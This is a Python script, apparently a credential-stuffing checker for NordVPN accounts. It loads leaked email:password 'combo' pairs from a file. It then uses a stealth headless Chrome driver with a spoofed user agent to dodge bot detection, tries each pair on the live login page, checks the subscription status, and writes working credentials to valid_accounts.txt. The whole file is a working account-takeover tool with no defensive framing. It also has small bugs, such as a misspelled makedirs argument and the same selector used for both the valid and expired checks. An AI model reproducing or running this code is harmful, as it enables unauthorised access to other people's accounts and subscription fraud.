import time
import os
import undetected_chromedriver as stealthdriver
import sys

from pathlib import Path
from selenium.webdriver.common.by import By
from header import title

user = []
password = []
if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
    user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
    save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
    os.makedirs(save_directory, exists_ok=True)
    save_file = "\\valid_accounts.txt"
else:
    user_directory = str(Path(__file__).parent)  + "/nord.txt"
    save_directory = str(Path(__file__).parent) + "/valid_accounts"
    os.makedirs(save_directory, exists_ok=True)
    save_file = "/valid_accounts.txt"
try:
    os.remove(save_directory + save_file)
except FileNotFoundError:
    pass
try:
    with open (user_directory, 'r') as combos:
        for i in combos.readlines():
            user.append(i.split(":")[0])
            password.append(i.split(":")[1].split(" ")[0].strip())
except FileNotFoundError as e:
    print("No combolist found in: " + user_directory + "\nPlease add 'nord.txt' and try again.\nPress Enter to end.")
    input()
    exit()

index = 0
title()
while index != len(user): 
    with open(save_directory + save_file, 'a') as accounts:
        browser_options = stealthdriver.ChromeOptions()
        browser_options.add_argument(
            'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/103.0.5060.134 ''Safari/537.36')
        browser_options.add_argument('--headless=new')
        browser = stealthdriver.Chrome(options=browser_options)
        page = 'https://www.nordvpn.com/'
        browser.set_window_size(800, 300)
        browser.get(page)
        print('\rTrying Combo {} out of {}'.format(index + 1, len(user)), end='')
        time.sleep(2)
        continue_button = browser.find_element(By.XPATH, '//*[@id="js-HeaderV3__mini-nav"]/li[3]/a')
        continue_button.click()
        time.sleep(8)
        browser.switch_to.window(browser.window_handles[1])
        email_box = browser.find_element(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input')
        continue_button = browser.find_element(By.XPATH, '//*[@id="app"]/div/div/main/form/fieldset/button')
        email_box.send_keys(user[index])
        continue_button.click()
        time.sleep(5)
        password_box = browser.find_element(By.XPATH, 'html/body/div/div/div/main/form/fieldset/div[3]/span/input')
        login_button = browser.find_element(By.XPATH, 'html/body/div/div/div/main/form/fieldset/button')
        password_box.send_keys(password[index])
        login_button.click()
        time.sleep(4)
        if 'https://my.nordaccount.com/dashboard/' in browser.current_url:
            subscription_page = 'https://my.nordaccount.com/billing/my-subscriptions/'
            browser.get(subscription_page)
            time.sleep(4)
            if browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p'):
            	no_sub = browser.find_element(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p').text
            	if 'No active subscriptions' in no_sub:
            		print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
            if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
                print(" | {}:{} ---> Success!".format(user[index], password[index]))
                accounts.write(user[index] + ":" + password[index] + " ---> Valid\n")
            if browser.find_elements(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div[1]/div/div/div[1]/div[2]/div'):
                print(" | {}:{} ---> Expired!".format(user[index], password[index]))
        else:
            print(" | {}:{} ---> Account not working".format(user[index], password[index]))
        browser.quit()
        index += 1
